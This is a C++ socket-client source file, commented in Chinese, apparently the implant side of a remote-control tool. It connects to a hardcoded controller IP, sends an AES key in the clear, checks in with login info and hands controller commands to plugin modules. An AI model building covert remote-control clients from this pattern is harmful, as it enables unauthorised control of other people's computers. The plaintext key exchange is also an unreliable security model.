#include "pch.h"
#include "SocketClient.h"
#include "Misc.h"
#include "Packet.h"
#include "Login.h"



#define SERVER_ADDRESS L"192.168.0.101"
//#define SERVER_ADDRESS L"81.70.160.41"
#define SERVER_PORT 5555;


CSocketClient::CSocketClient(CSocketClient* pMainSocketClient /* = nullptr*/) : m_pTcpPackClient(this) {
	
	//m_dwConnectId = m_pTcpPackClient->GetConnectionID();//怎么一直是0？
	m_pLastSocketClient = NULL;
	m_pNextSocketClient = NULL;

	m_dwClientStatus = NOT_ONLINE;

	m_bIsMainSocketClient = (pMainSocketClient == nullptr) ? true : false;

	m_pMainSocketClient = m_bIsMainSocketClient ? this : pMainSocketClient;

	// 设置数据包最大长度（有效数据包最大长度不能超过0x3FFFFF字节(4MB-1B)，默认：262144/0x40000 (256KB)
	m_pTcpPackClient->SetMaxPackSize(PACKET_MAX_LENGTH);
	// 设置心跳检测包发送间隔
	m_pTcpPackClient->SetKeepAliveTime(60 * 1000);
	// 设置心跳检测重试包发送间隔
	m_pTcpPackClient->SetKeepAliveInterval(20 * 1000);
}


CSocketClient::~CSocketClient() {
	if (m_bIsMainSocketClient) {
		delete m_pModuleManage;
		m_pModuleManage = NULL;
	}
	CloseHandle(m_hChildSocketClientExitEvent);
}


BOOL CSocketClient::StartSocketClient() {

	LPCTSTR lpszRemoteAddress = SERVER_ADDRESS;
	WORD wPort = SERVER_PORT;
	BOOL bRet;

	if (!(m_pTcpPackClient->IsConnected())) {
		bRet = m_pTcpPackClient->Start(lpszRemoteAddress, wPort, 0);		// 默认是异步connect，bRet返回true不一定代表成功连接。坑死我了
		if (!bRet) {
			return false;
		}
	}

	m_hChildSocketClientExitEvent = CreateEvent(NULL, true, false, NULL);	// 第二个参数为true时表示手动重置事件

	// 组件管理对象
	if (m_bIsMainSocketClient) {
		m_pModuleManage = new CModuleManage(this);
	}

	// 生成随机密钥
	BYTE pbKey[16];
	BYTE pbIv[16];
	RandomBytes(pbKey, 16);
	RandomBytes(pbIv, 16);
	m_Crypto = CCrypto(AES_128_CFB, pbKey, pbIv);


	BYTE pbKeyAndIv[CRYPTO_KEY_PACKET_LENGTH];
	// 第一个字节表示是主socket的密钥还是子socket的密钥
	pbKeyAndIv[0] = (m_bIsMainSocketClient) ? CRYPTO_KEY_PACKET_TOKEN_FOR_MAIN_SOCKET : CRYPTO_KEY_PACKET_TOKEN_FOR_CHILD_SOCKET;
	memcpy(pbKeyAndIv + 1, pbKey, 16);
	memcpy(pbKeyAndIv + 17, pbIv, 16);

	// 向主控端发送密钥
	bRet = m_pTcpPackClient->Send(pbKeyAndIv, CRYPTO_KEY_PACKET_LENGTH);
	if (bRet) {
		printf("成功向服务器发送通信密钥:\n");
		PrintData(pbKeyAndIv, CRYPTO_KEY_PACKET_LENGTH);
	}

	m_dwConnectId = m_pTcpPackClient->GetConnectionID();			// 不可以在构造函数里GetConnectionID，一直会是0.估计start之后才有的CONNID吧
	return bRet;
}


BOOL CSocketClient::SendPacket(COMMAND_ID dwCommandId, PBYTE pbPacketBody, DWORD dwPacketBodyLength) {
	CPacket Packet = CPacket(this);
	Packet.PacketCombine(dwCommandId, pbPacketBody, dwPacketBodyLength);
	BOOL bRet = m_pTcpPackClient->Send(Packet.m_pbPacketCiphertext, Packet.m_dwPacketLength);
	printf("connected = %d\n", m_pTcpPackClient->IsConnected());
	return bRet;
}


// 写的时候只是用于阻塞子socket的退出。
void CSocketClient::WaitForExitEvent() {
	WaitForSingleObject(m_hChildSocketClientExitEvent, INFINITE);
}

void CSocketClient::DisconnectChildSocketClient() {
	SetEvent(m_hChildSocketClientExitEvent);
}




// 回调函数

EnHandleResult CSocketClient::OnPrepareConnect(ITcpClient* pSender, CONNID dwConnID, SOCKET socket) {
	printf("[Client %d] OnPrepareConnect: \n", dwConnID);

	return HR_OK;
}


EnHandleResult CSocketClient::OnConnect(ITcpClient* pSender, CONNID dwConnID) {
	printf("[Client %d] OnConnect: \n", dwConnID);

	return HR_OK;
}


EnHandleResult CSocketClient::OnHandShake(ITcpClient* pSender, CONNID dwConnID) {
	printf("[Client %d] OnHandShake: \n", dwConnID);
	return HR_OK;
}


EnHandleResult CSocketClient::OnSend(ITcpClient* pSender, CONNID dwConnID, const BYTE* pData, int iLength) {
	printf("[Client %d] OnSend: \n", dwConnID);
	PrintData((PBYTE)pData, iLength);

	return HR_OK;
}


EnHandleResult CSocketClient::OnReceive(ITcpClient* pSender, CONNID dwConnID, const BYTE* pData, int iLength) {
	printf("[Client %d] OnReceive: \n", dwConnID);

	PrintData((PBYTE)pData, iLength);

	CPacket* pPacket = new CPacket(this);				// TODO 还没找到好的delete的时机
	pPacket->PacketParse((PBYTE)pData, iLength);
	
	switch (pPacket->m_PacketHead.wCommandId) {
	// 处理主socket以及和子socket共有部分
	case CRYPTO_KEY:		// Server接收到Client的发出的密钥后，给Client响应一个CRYPTO_KEY包。
							// 如果是Client的主socket发来的，那么Client发出上线包
		if (m_bIsMainSocketClient) {
			m_dwClientStatus = WAIT_FOR_LOGIN;

			BYTE pbLoginPacketBody[LOGIN_PACKET_BODY_LENGTH];
			GetLoginInfo(pbLoginPacketBody);
			SendPacket(LOGIN, pbLoginPacketBody, LOGIN_PACKET_BODY_LENGTH);
		}
		else {
			m_dwClientStatus = LOGINED;				// 子socket不需要发上线包，直接就算登录
		}
		delete pPacket;
		pPacket = NULL;
		break;
	case LOGIN:

		m_dwClientStatus = LOGINED;
		delete pPacket;
		pPacket = NULL;
		break;

	case ECHO:
		printf("接收到ECHO测试包，明文内容如下：\n");
		PrintData(pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);

		// 再把这个明文发回给主控端（即服务端），以完成ECHO测试
		SendPacket(ECHO, pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength);
		delete pPacket;
		pPacket = NULL;
		break;


	default:					// 剩下的封包如果来自子socket，那就是组件相关的封包，传个CModuleManage对象
		if (m_dwClientStatus == LOGINED) {			// 对于子socket，必须收到主控端发来的CRYPTO_KEY包后，才是LOGINED状态。只有确认主控端收到密钥后才能解析下面的包。
			if (m_bIsMainSocketClient) {
				m_pModuleManage->OnReceiveConnectPacket(pPacket);			// 处理控件socket的CONNECT包，CONNECT包都来自主socket哦
			}
			else {
				assert(m_pModule != NULL);
				m_pModule->OnRecvivePacket(pPacket);			// 剩下的封包交给相关的组件处理（CModule是基类，派生出不同的组件类）
			}
		}
		break;
	}


	delete pPacket;
	pPacket = NULL;
	return HR_OK;
}


EnHandleResult CSocketClient::OnClose(ITcpClient* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode) {
	printf("[Client %d] OnClose: \n", dwConnID);

	if (!m_bIsMainSocketClient) {
		DisconnectChildSocketClient();
	}

	return HR_OK;
}